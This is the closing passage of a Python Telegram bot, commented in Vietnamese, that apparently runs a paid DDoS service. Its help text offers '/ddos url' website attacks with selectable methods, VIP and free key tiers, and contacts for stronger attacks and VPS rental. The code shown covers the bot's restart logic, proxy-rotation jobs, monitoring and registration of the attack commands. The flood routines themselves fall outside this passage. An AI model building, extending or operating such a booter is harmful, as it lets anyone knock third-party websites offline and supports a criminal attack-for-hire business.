        # Đợi 1 giây để đảm bảo file được lưu
        await asyncio.sleep(1)
        
        # Dừng tất cả các tiến trình ddos đang chạy
        await cleanup_attacks()
        
        logger.info("Bot is restarting...")
        
        # Khởi động lại script
        os.execl(sys.executable, sys.executable, *sys.argv)
        
    except Exception as e:
        logger.error(f"Error in restart command: {e}")
        await update.message.reply_text(f'''
╔═════════════════════════
║ ❌ LỖI KHỞI ĐỘNG LẠI
║ • {str(e)}
╚═══════════════════════════''')

async def send_restart_notification(application: Application) -> None:
    """Send notification after bot restart"""
    try:
        # Thay đổi đường dẫn file
        if os.path.exists("data/restart_info.json"):
            with open("data/restart_info.json", "r") as f:
                restart_info = json.load(f)
            
            restart_duration = round(time.time() - restart_info["restart_time"], 2)
            chat_id = restart_info["chat_id"]
            message_id = restart_info["message_id"]
            action = restart_info.get("action", "restart")

            message = f'''
╔══════════════════════════
║ ✅ KHỞI ĐỘNG LẠI THÀNH CÔNG
║ ⚡️ Tổng thời gian: {restart_duration}s
╚═══════════════════════════'''

            max_retries = 3
            retry_count = 0
            
            while retry_count < max_retries:
                try:
                    await application.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=message
                    )
                    logger.info("Successfully sent restart notification")
                    break
                except (TimedOut, RetryAfter) as e:
                    retry_count += 1
                    if retry_count < max_retries:
                        await asyncio.sleep(2)
                    else:
                        logger.error(f"Failed to send restart notification after {max_retries} retries")
                except Exception as e:
                    logger.error(f"Error sending restart notification: {e}")
                    break
            
            try:
                os.remove("data/restart_info.json")
                logger.info("Removed restart info file")
            except Exception as e:
                logger.error(f"Error removing restart info file: {e}")
            
            # Đảm bảo bot được bật
            global bot_active
            bot_active = True
            
    except Exception as e:
        logger.error(f"Error in send_restart_notification: {e}")

@restrict_room
async def start(update: Update, context: CallbackContext):
    message = '''<blockquote expandable>
<b>Hướng dẫn /ddos</b>
👉 <b>Ấn xem cách DDOS...</b> 👈

║ 📌 VIP /muavipduocgi:
║ • /ddos url - Tấn công website
║ • /ddos method url - Chọn methods
║ • /methods - Các phương thức tấn công
║ 💡 Phương thức mặc định - FLOOD
║
║ 📌 FREE /laykey:
║ • /ddos url - Tấn công website
║ • Mặc định method là FLOOD
║
║ ADMIN:
║ • /taskd - ... on - off
║ • /kill - ...
║ • /lsd - ...
║ • /cpx - ...
║ • /addpx - ...
║ • /uppx - ...
║ • /offd - ...
║ • /ond - ...
║ 💡 Ddos mạnh hơn ib. @tranthanhpho
║ 💡 Thuê vps ib. @NeganSSHConsole
╚═══════════════════════════</blockquote>'''

    await update.message.reply_text(message, parse_mode='HTML')


onitoring_task = None
async def start_monitoring(application: Application):
   """Start monitoring task on bot startup"""
   global monitoring_task
   try:
       if not monitoring_task or monitoring_task.removed:
           monitoring_task = application.job_queue.run_repeating(
               send_monitoring_info,
               interval=15,  # 15 giây gửi cái
               first=1,
               name='system_monitoring'
           )
           logger.info("Monitoring task started automatically on startup")
   except Exception as e:
       logger.error(f"Error starting monitoring task: {e}")



def main():
    try:
        logger.info("Starting bot initialization...")
        kill_all_processes()
        logger.info("Building application...")
        application = Application.builder().token(TOKEN).build()
        
        logger.info("Adding command handlers...")
        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("ddos", ddos))
        application.add_handler(CommandHandler("killd", kill_ddos))
        application.add_handler(CommandHandler("addpx", add_proxy))
        application.add_handler(CommandHandler("uppx", update_proxy_new))
        application.add_handler(CallbackQueryHandler(handle_status_check, pattern="^st_"))
        application.add_handler(CommandHandler("offd", bot_off))
        application.add_handler(CommandHandler("ond", bot_on))
        application.add_handler(CommandHandler("taskd", task))
        application.add_handler(CommandHandler("lsd", list_processes))
        application.add_handler(CommandHandler("methods", methods))
        application.add_handler(CommandHandler("rsd", restart_bot))
        application.add_handler(CommandHandler("cpx", check_proxy_cron_status))
        logger.info("Setting up job queue...")
        job_queue = application.job_queue
        job_queue.run_repeating(
            callback=check_and_update_proxy,
            interval=1800,
            first=1,
            name='proxy_update'
        )
        
        logger.info("Adding error handler...")
        application.add_error_handler(error_handler)
        # Gửi thông báo khởi động nếu được (ko lỗi)
        application.job_queue.run_once(
        lambda context: asyncio.create_task(send_restart_notification(application)),
        when=1  # Đợi 1 giây sau khi khởi động
        )
        # Thêm proxy cron vào startup tasks
        application.job_queue.run_once(
            lambda context: asyncio.create_task(start_proxy_cron(application)),
            when=3  # Chạy sau 5 giây để đảm bảo bot đã khởi động hoàn toàn
        )
        application.job_queue.run_once(
           lambda context: asyncio.create_task(start_monitoring(application)),
           when=5  # Chạy sau 5 giây
       )
        logger.info("Setting up cleanup...")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(cleanup_attacks())
        
        logger.info("Starting polling...")
        application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
        
    except Exception as e:
        logger.error(f"Error in main: {e}", exc_info=True)
        raise


if __name__ == '__main__':
    try:
        logger.info("Starting main program...")
        observer = Observer()
        handler = ReloadOnChangeHandler(lambda: os.execl(sys.executable, sys.executable, *sys.argv))
        observer.schedule(handler, path='.', recursive=False)
        
        logger.info("Starting file observer...")
        observer.start()
        
        logger.info("Calling main function...")
        main()
    except KeyboardInterrupt:
        logger.info("Received keyboard interrupt, stopping...")
        observer.stop()
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
    finally:
        logger.info("Joining observer thread...")
        observer.join()
